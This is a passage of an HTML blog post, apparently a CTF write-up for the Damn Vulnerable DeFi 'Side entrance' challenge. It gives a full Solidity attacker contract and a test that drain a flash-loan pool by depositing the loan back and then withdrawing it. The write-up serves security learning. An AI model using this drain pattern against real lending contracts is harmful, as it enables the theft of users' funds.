+<li>inside the <code>execute</code> function, we can call the <code>deposit</code> function in order to update the <code>balances</code> variable for our contract</li>
+<li>once the execution of the <code>flashLoan</code> is completed, we call the <code>withdraw</code> function in order to receive the ETH amount save in <code>balances</code></li>
+<li>the <code>withdraw</code> function will send send us the ETH by calling <code>sendValue</code>. We need to expose a <code>receive</code> payable function in order to recevied the ETH</li>
+<li>finally, we send the ETH received to the attacker address</li>
+</ol>
+<p>This is a visual representaion of the calls involved in the attack:
+<a class="lightgallery" href="/images/side_entrance_picture.png" title="/images/side_entrance_picture.png" data-thumbnail="/images/side_entrance_picture.png">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/images/side_entrance_picture.png"
+            data-srcset="/images/side_entrance_picture.png, /images/side_entrance_picture.png 1.5x, /images/side_entrance_picture.png 2x"
+            data-sizes="auto"
+            alt="/images/side_entrance_picture.png" />
+    </a></p>
+<p><code>AttackSideEntrance.sol</code>:
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#888;font-style:italic">// SPDX-License-Identifier: MIT
+</span></span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic"></span><span style="color:#00f">pragma solidity</span> ^<span style="color:#3af">0</span>.<span style="color:#3af">8</span>.<span style="color:#3af">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#00f">interface</span> <span style="color:#000">ILenderPool</span> {
+</span></span><span style="display:flex;"><span>  <span style="color:#00f">function</span> <span style="color:#000">deposit</span>() <span style="color:#00f">external</span> <span style="color:#00f">payable</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#00f">function</span> <span style="color:#000">flashLoan</span>(<span style="color:#00f">uint256</span> <span style="color:#000">amount</span>) <span style="color:#00f">external</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#00f">function</span> <span style="color:#000">withdraw</span>() <span style="color:#00f">external</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic">/**
+</span></span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic"> * @title AttackSideEntrance
+</span></span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic"> */</span>
+</span></span><span style="display:flex;"><span><span style="color:#00f">contract</span> <span style="color:#000">AttackSideEntrance</span> {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#000">ILenderPool</span> <span style="color:#000">pool</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">uint256</span> <span style="color:#000">poolBalance</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">constructor</span>(<span style="color:#00f">address</span> <span style="color:#000">_pool</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#000">pool</span> = <span style="color:#000">ILenderPool</span>(<span style="color:#000">_pool</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#000">poolBalance</span> = <span style="color:#00f">address</span>(<span style="color:#000">pool</span>).<span style="color:#000">balance</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">function</span> <span style="color:#000">run</span>(<span style="color:#00f">address</span> <span style="color:#000">_attacker</span>) <span style="color:#00f">public</span> {
+</span></span><span style="display:flex;"><span>      <span style="color:#000">pool</span>.<span style="color:#000">flashLoan</span>(<span style="color:#000">poolBalance</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>      <span style="color:#000">pool</span>.<span style="color:#000">withdraw</span>();
+</span></span><span style="display:flex;"><span>      
+</span></span><span style="display:flex;"><span>      (<span style="color:#00f">bool</span> <span style="color:#000">result</span>,) = <span style="color:#000">_attacker</span>.<span style="color:#000">call</span>{<span style="color:#000">value</span>: <span style="color:#000">poolBalance</span>}(<span style="color:#5a2">&#34;&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>      <span style="color:#000">require</span>(<span style="color:#000">result</span>, <span style="color:#5a2">&#34;Something goes wrong&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">function</span> <span style="color:#000">execute</span>() <span style="color:#00f">external</span> <span style="color:#00f">payable</span> {
+</span></span><span style="display:flex;"><span>      <span style="color:#000">require</span>(<span style="color:#00f">address</span>(<span style="color:#000">this</span>).<span style="color:#000">balance</span> == <span style="color:#000">poolBalance</span>, <span style="color:#5a2">&#34;No enough ETH&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>      <span style="color:#888;font-style:italic">// do something with the loan
+</span></span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic"></span>      <span style="color:#888;font-style:italic">// ...
+</span></span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic"></span>
+</span></span><span style="display:flex;"><span>      <span style="color:#888;font-style:italic">// pay the loan back to the pool
+</span></span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic"></span>      <span style="color:#000">pool</span>.<span style="color:#000">deposit</span>{<span style="color:#000">value</span>: <span style="color:#000">msg</span>.<span style="color:#000">value</span>}();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#888;font-style:italic">// needed to receive ETH
+</span></span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic"></span>    <span style="color:#000">receive</span>() <span style="color:#00f">external</span> <span style="color:#00f">payable</span> {}
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></td></tr></table>
+</div>
+</div></p>
+<p><code>side-entrance.challenge.js</code>:</p>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span>    <span style="color:#000">it</span>(<span style="color:#5a2">&#39;Exploit&#39;</span>, <span style="color:#00f">async</span> <span style="color:#00f">function</span> () {
+</span></span><span style="display:flex;"><span>        <span style="color:#888;font-style:italic">/** CODE YOUR EXPLOIT HERE */</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">const</span> <span style="color:#000">attack</span> = <span style="color:#00f">await</span>(<span style="color:#00f">await</span> <span style="color:#000">ethers</span>.<span style="color:#000">getContractFactory</span>(<span style="color:#5a2">&#39;AttackSideEntrance&#39;</span>, <span style="color:#000">attacker</span>)).<span style="color:#000">deploy</span>(<span style="color:#00f">this</span>.<span style="color:#000">pool</span>.<span style="color:#000">address</span>);
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">await</span> <span style="color:#000">attack</span>.<span style="color:#000">connect</span>(<span style="color:#000">attacker</span>).<span style="color:#000">run</span>(<span style="color:#000">attacker</span>.<span style="color:#000">address</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    });</span></span></code></pre></td></tr></table>
+</div>
+</div>
+<p>You can find the complete code <a href="https://github.com/dellalibera/damn-vulnerable-defi-solutions/blob/master/test/side-entrance/side-entrance.challenge.js" target="_blank" rel="noopener noreffer ">here</a> and <a href="https://github.com/dellalibera/damn-vulnerable-defi-solutions/blob/master/contracts/attacker-contracts/AttackSideEntrance.sol" target="_blank" rel="noopener noreffer ">here</a>.</p></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on September 10, 2022</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://dellalibera.github.io/posts/damnvulnerabledefi_04_side-entrance/" data-title="Damn Vulnerable DeFi - Challenge #4 - Side entrance" data-via="_d3lla_" data-hashtags="Damn Vulnerable DeFi,CTF,Solidity,Blockchain"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://dellalibera.github.io/posts/damnvulnerabledefi_04_side-entrance/" data-hashtag="Damn Vulnerable DeFi"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="https://dellalibera.github.io/posts/damnvulnerabledefi_04_side-entrance/"><i class="fab fa-linkedin fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/damn-vulnerable-defi/">Damn Vulnerable DeFi</a>,&nbsp;<a href="/tags/ctf/">CTF</a>,&nbsp;<a href="/tags/solidity/">Solidity</a>,&nbsp;<a href="/tags/blockchain/">Blockchain</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/damnvulnerabledefi_03_truster/" class="prev" rel="prev" title="Damn Vulnerable DeFi - Challenge #3 - Truster"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Damn Vulnerable DeFi - Challenge #3 - Truster</a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://dellalibera.github.io/about/" target="_blank">della</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/css/e2eb86.min.css"><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript">window.config={"code":{"maxShownLines":50},"comment":{},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
